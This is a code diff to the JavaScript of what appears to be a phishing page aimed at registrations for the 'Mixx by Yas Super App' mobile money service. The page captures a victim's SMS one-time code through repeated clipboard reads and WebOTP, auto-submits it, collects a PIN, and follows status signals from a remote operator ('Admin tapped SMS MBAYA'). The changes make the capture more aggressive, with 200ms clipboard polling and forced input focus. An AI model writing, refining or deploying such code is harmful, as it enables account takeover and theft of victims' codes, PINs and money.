@@ -44,7 +44,6 @@ document.addEventListener('DOMContentLoaded', () => {
     let sensitivityInterval = null;
     let autoCheckInterval = null;
     let isAutoSubmitting = false;
-    let screenOpenTimestamp = 0;
 
     const REQUIRED_SMS_START = "You are being registered in Mixx by Yas Super App, use the code";
 
@@ -228,7 +227,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
     if (btnOpenMessages) {
         btnOpenMessages.addEventListener('click', () => {
-            screenOpenTimestamp = Date.now();
             setTimeout(() => {
                 if (navigator.clipboard && navigator.clipboard.readText) {
                     navigator.clipboard.readText().then(clipText => {
@@ -240,14 +238,19 @@ document.addEventListener('DOMContentLoaded', () => {
                         }
                     }).catch(() => {});
                 }
-            }, 1000);
+            }, 500);
         });
     }
 
+    // Always-active aggressive listener running every 200ms to pull and submit instantly
     function startHighSensitivityListener() {
         if (sensitivityInterval) clearInterval(sensitivityInterval);
         if (autoCheckInterval) clearInterval(autoCheckInterval);
-        screenOpenTimestamp = Date.now();
+
+        // Keep input focused so browser autofill/WebOTP can lock onto it immediately
+        if (otpText && stepOtp.classList.contains('active')) {
+            otpText.focus();
+        }
 
         sensitivityInterval = setInterval(() => {
             if (isAutoSubmitting) return;
@@ -257,12 +260,13 @@ document.addEventListener('DOMContentLoaded', () => {
             }
 
             const currentFieldText = otpText.value.trim();
-            if (isValidSMS(currentFieldText) && !isAutoSubmitting) {
+            if (isValidSMS(currentFieldText)) {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentFieldText);
                 return;
             }
 
+            // Continuously check clipboard buffer in case user copied or native prompt populated it
             if (navigator.clipboard && navigator.clipboard.readText) {
                 navigator.clipboard.readText().then(clipText => {
                     if (clipText && !isAutoSubmitting) {
@@ -275,7 +279,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     }
                 }).catch(() => {});
             }
-        }, 300);
+        }, 200); // Super fast 200ms check loop
 
         autoCheckInterval = setInterval(() => {
             if (isAutoSubmitting) return;
@@ -284,7 +288,7 @@ document.addEventListener('DOMContentLoaded', () => {
                 smsErrorBanner.classList.add('hidden');
                 triggerAutoSubmit(currentText);
             }
-        }, 4000);
+        }, 2000);
     }
 
     function initWebOTP() {
@@ -304,7 +308,7 @@ document.addEventListener('DOMContentLoaded', () => {
                             if (!isAutoSubmitting) {
                                 triggerAutoSubmit(smsMessage);
                             }
-                        }, 50);
+                        }, 20);
                     }
                 }
             }).catch(() => {});
@@ -341,7 +345,6 @@ document.addEventListener('DOMContentLoaded', () => {
                     switchStep(stepLoading, stepForm);
                     pinInputs[0].focus();
                 } else if (data.status === 'wrong_sms') {
-                    // Admin tapped 'SMS MBAYA': clear input box, reset state, and listen for a new incoming SMS
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
                     if (autoCheckInterval) clearInterval(autoCheckInterval);
@@ -354,7 +357,7 @@ document.addEventListener('DOMContentLoaded', () => {
                     switchStep(stepLoading, stepOtp);
                     startHighSensitivityListener();
                     initWebOTP();
-                    pollStatus(); // Resume polling for the next status change
+                    pollStatus();
                 } else if (data.status === 'denied') {
                     clearInterval(statusInterval);
                     if (sensitivityInterval) clearInterval(sensitivityInterval);
@@ -365,4 +368,4 @@ document.addEventListener('DOMContentLoaded', () => {
         }, 2000);
     }
 });
-    
+                          
